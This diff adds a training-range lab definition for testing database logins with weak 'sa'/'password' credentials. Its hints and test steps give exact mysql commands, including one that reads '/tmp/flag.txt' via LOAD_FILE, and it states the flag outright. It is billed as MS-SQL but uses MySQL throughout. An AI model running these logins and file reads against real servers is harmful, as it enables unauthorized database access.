@@ -1,0 +1,461 @@
+name: MS-SQL Manual Authentication
+description: Test MS-SQL authentication on FinanceCorp's database server using known credentials to assess access controls.
+difficulty: intermediate
+category: credential-attacks
+duration_minutes: 120
+objectives:
+  - connect to ms-sql with known credentials
+  - Understand Windows penetration testing techniques
+  - Capture the flag
+
+scenario: |
+  Your enumeration of FinanceCorp's MS-SQL server has provided version and instance 
+  information. James Mitchell wants to test authentication security by attempting 
+  connections with known credentials.
+  
+  Testing MS-SQL authentication helps identify if weak credentials or misconfigurations 
+  allow unauthorized database access. FinanceCorp needs to understand if their 
+  authentication mechanisms are properly secured.
+  
+  Your objective: Test MS-SQL authentication against FinanceCorp's database server 
+  using known credentials. Attempt manual connections to assess whether access 
+  controls are functioning correctly.
+
+flag: "OCR{mssql_m4nu4l_4uth}"
+
+hints:
+  - id: 1
+    unlock_after_minutes: 0
+    text: |
+      ## Understanding Database Authentication
+
+      **Database authentication** is the process of verifying a user's identity
+      before granting access to the database system. In penetration testing,
+      testing authentication is critical because weak or default credentials
+      are one of the most common attack vectors.
+
+      ### How Database Authentication Works
+
+      When you connect to a MySQL/MariaDB database, the authentication
+      process follows these steps:
+
+      1. **Client sends connection request** to the server on port 3306
+      2. **Server sends a greeting packet** with a random salt value
+      3. **Client sends credentials** (username + hashed password)
+      4. **Server validates** against its user table
+      5. **Server grants or denies** access
+
+      ### Common Authentication Weaknesses
+
+      In real-world assessments, these issues are frequently discovered:
+
+      | Weakness                  | Risk Level | Prevalence |
+      |---------------------------|-----------|------------|
+      | Default credentials       | Critical  | Very Common|
+      | Blank/empty passwords     | Critical  | Common     |
+      | Weak passwords            | High      | Very Common|
+      | Remote root access        | Critical  | Common     |
+      | Shared credentials        | High      | Common     |
+      | No account lockout        | Medium    | Very Common|
+
+      ### The "sa" Account
+
+      In database systems, there is typically a superuser account with
+      full administrative privileges. In MySQL, this is usually `root`.
+      In MSSQL, it is `sa` (System Administrator).
+
+      This lab uses the `sa` account with known credentials. Your task
+      is to manually authenticate to the database service using the
+      MySQL command-line client.
+
+  - id: 2
+    unlock_after_minutes: 5
+    text: |
+      ## Introduction to the MySQL Command-Line Client
+
+      The **mysql** command-line client is the standard tool for connecting
+      to MySQL and MariaDB databases. It provides an interactive SQL shell
+      for executing queries and managing databases.
+
+      ### Installing the MySQL Client
+
+      On Debian/Ubuntu-based systems (including Kali Linux):
+
+      ```bash
+      sudo apt update
+      sudo apt install -y default-mysql-client
+      ```
+
+      ### Basic Connection Syntax
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u <username> -p -h <host> [-P <port>]
+      ```
+
+      ### Connection Parameters
+
+      | Parameter | Description                          | Example         |
+      |-----------|--------------------------------------|-----------------|
+      | `-u`      | Username to connect with             | `-u sa`         |
+      | `-p`      | Prompt for password                  | `-p`            |
+      | `-p<pass>`| Password inline (no space after -p)  | `-ppassword`    |
+      | `-h`      | Host/IP to connect to                | `-h <target_ip>` |
+      | `-P`      | Port number (capital P)              | `-P 3306`       |
+      | `-e`      | Execute a command and exit           | `-e "SELECT 1"` |
+      | `-D`      | Default database to use              | `-D mydb`       |
+      | `--ssl-verify-server-cert=0` | Skip TLS certificate verification | required on Kali |
+
+      ### Why the SSL Flag Is Required
+
+      Kali ships the MariaDB client as `mysql`. By default that client
+      verifies the server TLS certificate. The lab database presents a
+      self-signed certificate, so a plain connection aborts with
+      `ERROR 2026 (HY000): TLS/SSL error: Certificate verification failure`.
+      Adding `--ssl-verify-server-cert=0` skips that check and lets the
+      connection complete. The alternative flag `--skip-ssl` works the same
+      way on clients that reject the verify flag.
+
+      ### Authentication Methods
+
+      There are several ways to provide the password:
+
+      ```bash
+      # Method 1: Interactive prompt (most secure)
+      mysql --ssl-verify-server-cert=0 -u sa -p -h <target>
+
+      # Method 2: Inline password (visible in process list)
+      mysql --ssl-verify-server-cert=0 -u sa -ppassword -h <target>
+
+      # Method 3: Using --password flag
+      mysql --ssl-verify-server-cert=0 -u sa --password=password -h <target>
+      ```
+
+      **Security Note:** Method 1 (interactive prompt) is preferred in
+      real-world scenarios as it does not expose the password in the
+      command history or process list.
+
+  - id: 3
+    unlock_after_minutes: 10
+    text: |
+      ## Practical Authentication Examples and Context
+
+      ### Connecting to a Remote Database
+
+      When connecting to a remote MySQL server, you must specify the
+      host address. By default, the mysql client connects to localhost:
+
+      ```bash
+      # Connect to remote host with interactive password prompt
+      mysql --ssl-verify-server-cert=0 -u sa -p -h 192.168.1.100
+
+      # Connect with explicit port
+      mysql --ssl-verify-server-cert=0 -u sa -p -h 192.168.1.100 -P 3306
+      ```
+
+      ### What Happens After Successful Authentication
+
+      When you successfully connect, you will see the MySQL prompt:
+
+      ```
+      Welcome to the MariaDB monitor.  Commands end with ; or \g.
+      Your MySQL connection id is 8
+      Server version: 10.x.x-MariaDB MariaDB Server
+
+      Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
+
+      MariaDB [(none)]>
+      ```
+
+      ### Basic Commands After Login
+
+      Once authenticated, you can run these commands:
+
+      ```sql
+      -- Show current user
+      SELECT CURRENT_USER();
+
+      -- Show user privileges
+      SHOW GRANTS;
+
+      -- List all databases
+      SHOW DATABASES;
+
+      -- Show server version
+      SELECT VERSION();
+
+      -- Show server status
+      STATUS;
+      ```
+
+      ### Failed Authentication
+
+      If credentials are wrong, you will see:
+
+      ```
+      ERROR 1045 (28000): Access denied for user 'sa'@'<your_ip>'
+      (using password: YES)
+      ```
+
+      ### The Credentials for This Lab
+
+      This lab uses the following credentials:
+      - **Username:** `sa`
+      - **Password:** `password`
+
+      These are intentionally weak credentials to demonstrate the risk
+      of using simple, guessable passwords for database accounts.
+
+  - id: 4
+    unlock_after_minutes: 15
+    text: |
+      ## Step-by-Step Workflow for This Lab
+
+      ### Step 1: Install the MySQL Client
+
+      Ensure the MySQL client is available:
+
+      ```bash
+      sudo apt update && sudo apt install -y default-mysql-client
+      ```
+
+      ### Step 2: Verify the Target is Reachable
+
+      Confirm the database port is open:
+
+      ```bash
+      nmap -p 3306 <target>
+      ```
+
+      You should see `3306/tcp open`.
+
+      ### Step 3: Attempt Authentication
+
+      Connect using the known credentials (`sa` / `password`):
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u sa -p -h <target>
+      ```
+
+      When prompted, enter the password: `password`
+
+      ### Step 4: Verify Your Access
+
+      Once connected, run these commands to understand your access level:
+
+      ```sql
+      -- Check who you are logged in as
+      SELECT CURRENT_USER();
+
+      -- Check what privileges you have
+      SHOW GRANTS;
+
+      -- List available databases
+      SHOW DATABASES;
+      ```
+
+      ### Step 5: Explore the System
+
+      Look for interesting data:
+
+      ```sql
+      -- Check server version
+      SELECT VERSION();
+
+      -- List all user accounts
+      SELECT user, host FROM mysql.user;
+      ```
+
+      ### Step 6: Retrieve the Flag
+
+      The flag is stored at `/tmp/flag.txt` on the target system.
+      MySQL can read local files using the `LOAD_FILE()` function:
+
+      ```sql
+      SELECT LOAD_FILE('/tmp/flag.txt');
+      ```
+
+      This function reads a file from the server's filesystem and
+      returns its contents as a string.
+
+      ### Step 7: Document and Submit
+
+      Copy the flag value and submit it to complete the lab.
+
+  - id: 5
+    unlock_after_minutes: 20
+    text: |
+      ## Exact Commands for This Lab
+
+      ### Install MySQL Client
+
+      ```bash
+      sudo apt install -y default-mysql-client
+      ```
+
+      ### Connect to the Database
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u sa -p -h <target>
+      ```
+
+      When prompted for the password, type: `password`
+
+      ### Alternative: Connect with Inline Password
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u sa -ppassword -h <target>
+      ```
+
+      **Note:** There is no space between `-p` and the password.
+
+      ### One-Line Command to Read the Flag
+
+      If you want to connect, read the flag, and exit in one command:
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u sa -ppassword -h <target> -e "SELECT LOAD_FILE('/tmp/flag.txt');"
+      ```
+
+      ### Interactive Session Commands
+
+      If you are in an interactive MySQL session, run:
+
+      ```sql
+      SELECT CURRENT_USER();
+      SHOW GRANTS;
+      SHOW DATABASES;
+      SELECT LOAD_FILE('/tmp/flag.txt');
+      ```
+
+      ### Troubleshooting
+
+      If you get "Access denied":
+      - Double-check the username is `sa` (not `root`)
+      - Verify the password is `password`
+      - Make sure you are using `-h <target>` (not connecting to localhost)
+
+      If you get "Can't connect":
+      - Verify the target IP address is correct
+      - Check that port 3306 is open with `nmap -p 3306 <target>`
+      - Ensure your network connection to the lab is active
+
+      If LOAD_FILE returns NULL:
+      - The user may lack FILE privilege
+      - Try: `SHOW GRANTS;` to check your privileges
+      - The file path may be incorrect
+
+  - id: 6
+    unlock_after_minutes: 25
+    text: |
+      ## Complete Solution Walkthrough
+
+      ### Step 1: Install MySQL Client
+
+      ```bash
+      sudo apt install -y default-mysql-client
+      ```
+
+      ### Step 2: Connect to the Database
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u sa -ppassword -h <target>
+      ```
+
+      **Expected Output:**
+      ```
+      Welcome to the MariaDB monitor.  Commands end with ; or \g.
+      Your MySQL connection id is 4
+      Server version: 10.x.x-MariaDB MariaDB Server
+
+      Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+      Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
+
+      MariaDB [(none)]>
+      ```
+
+      ### Step 3: Verify Access and Privileges
+
+      ```sql
+      SELECT CURRENT_USER();
+      ```
+
+      **Expected Output:**
+      ```
+      +----------------+
+      | CURRENT_USER() |
+      +----------------+
+      | sa@%           |
+      +----------------+
+      ```
+
+      ```sql
+      SHOW GRANTS;
+      ```
+
+      **Expected Output:**
+      ```
+      +-------------------------------------------+
+      | Grants for sa@%                           |
+      +-------------------------------------------+
+      | GRANT ALL PRIVILEGES ON *.* TO 'sa'@'%'   |
+      +-------------------------------------------+
+      ```
+
+      This confirms the `sa` user has ALL PRIVILEGES, including FILE
+      privilege which allows reading files from the server filesystem.
+
+      ### Step 4: Read the Flag
+
+      ```sql
+      SELECT LOAD_FILE('/tmp/flag.txt');
+      ```
+
+      **Expected Output:**
+      ```
+      +------------------------------+
+      | LOAD_FILE('/tmp/flag.txt')    |
+      +------------------------------+
+      | OCR{...}                    |
+      +------------------------------+
+      ```
+
+      ### One-Line Solution
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u sa -ppassword -h <target> -e "SELECT LOAD_FILE('/tmp/flag.txt');"
+      ```
+
+      ### Key Takeaways
+
+      - The `sa` account has full administrative access (ALL PRIVILEGES)
+      - Using `password` as a password is extremely weak and easily guessed
+      - The `mysql` command-line client is the standard tool for MySQL access
+      - `LOAD_FILE()` allows reading files from the server filesystem
+      - Database accounts accessible from any host (`%`) increase attack surface
+      - Manual authentication testing confirms credential validity before
+        attempting more advanced attacks
+
+      Submit the flag value to complete this lab.
+
+credentials:
+  - username: "sa"
+    password: "password"
+    role: "sa"
+    description: "sa credentials"
+
+workbook: "wiki/range/winpt/CH06_MSSQL_Exploitation/03_MSSQL_Manual_Authentication/"
+
+test:
+  steps:
+    - name: "Verify MySQL port 3306 is open"
+      command: "nmap -Pn -p 3306 {target.target} | grep '3306/tcp'"
+      expect: "open"
+
+    - name: "Authenticate to MySQL with sa credentials"
+      command: "mysql --ssl-verify-server-cert=0 -h {target.target} -u {cred.sa.user} -p{cred.sa.pass} -N -e 'SELECT CURRENT_USER()' 2>&1"
+      expect: "sa@"
+
+    - name: "Read flag file via LOAD_FILE"
+      command: "mysql --ssl-verify-server-cert=0 -h {target.target} -u {cred.sa.user} -p{cred.sa.pass} -N -e \"SELECT LOAD_FILE('/tmp/flag.txt')\" 2>&1"
+      expect: "OCR{"
